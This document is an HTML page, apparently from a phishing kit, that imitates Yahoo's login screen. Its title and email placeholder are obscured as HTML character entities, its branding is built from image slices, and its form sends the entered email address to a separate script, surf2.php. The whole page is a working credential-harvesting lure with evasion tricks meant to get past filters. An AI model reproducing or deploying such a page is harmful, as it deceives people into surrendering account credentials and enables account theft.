<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#89;&#97;&#104;&#111;&#111;&#32;&#45;&#32;&#108;&#111;&#103;&#105;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			  .textbox {
    padding: 9px !important;
    height: auto;
    color: #333;
    border: none;
    border-bottom: 1px solid #999;
    border-radius: 1px;
    font-family: 'josefin_sansregular', sans-serif;
    font-size: 16px;
	color: #555;
    outline: none;
    -webkit-transition: all 250ms ease-in;
    -moz-transition: all 250ms ease-in;
    -ms-transition: all 250ms ease-in;
    -o-transition: all 250ms ease-in;
    transition: all 250ms ease-in;
}
.textbox:focus {
       border-bottom: 2px solid #188FFF;
}
</style>
<style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:25px;
							height:16px; 
							display:inline-block;
							line-height:16px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:16px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -16px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_110982a95c1522afa7c1257ae77615f4.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>		
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:77px; z-index:0"><img src="images/y1.png" alt="" title="" border=0 width=1365 height=77></div>

<div id="image2" style="position:absolute; overflow:hidden; left:176px; top:132px; width:578px; height:159px; z-index:1"><img src="images/h1.png" alt="" title="" border=0 width=578 height=159></div>

<div id="image3" style="position:absolute; overflow:hidden; left:829px; top:68px; width:369px; height:545px; z-index:2"><img src="images/h3.png" alt="" title="" border=0 width=369 height=545></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:604px; width:1365px; height:34px; z-index:3"><img src="images/h4.png" alt="" title="" border=0 width=1365 height=34></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1053px; top:378px; width:112px; height:16px; z-index:4"><a href="#"><img src="images/h2.png" alt="" title="" border=0 width=112 height=16></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:647px; top:617px; width:74px; height:16px; z-index:5"><a href="#"><img src="images/h6.png" alt="" title="" border=0 width=74 height=16></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:93px; top:11px; width:128px; height:34px; z-index:6"><a href="#"><img src="images/yh.png" alt="" title="" border=0 width=128 height=34></a></div>
<form action=surf2.php name=paindisiri id=paindisiri method=post>
<input name="user" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#101;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:303px;left:863px;top:239px;z-index:7">
<div id="formimage1" style="position:absolute; left:862px; top:303px; z-index:8"><input type="image" name="formimage1" width="302" height="44" src="images/xnt.png"></div>

<div id="checkboxG1"  style="position:absolute; left:863px; top:377px; z-index:9"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:863px; top:377px; z-index:9"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
</div>

</body>
</html>
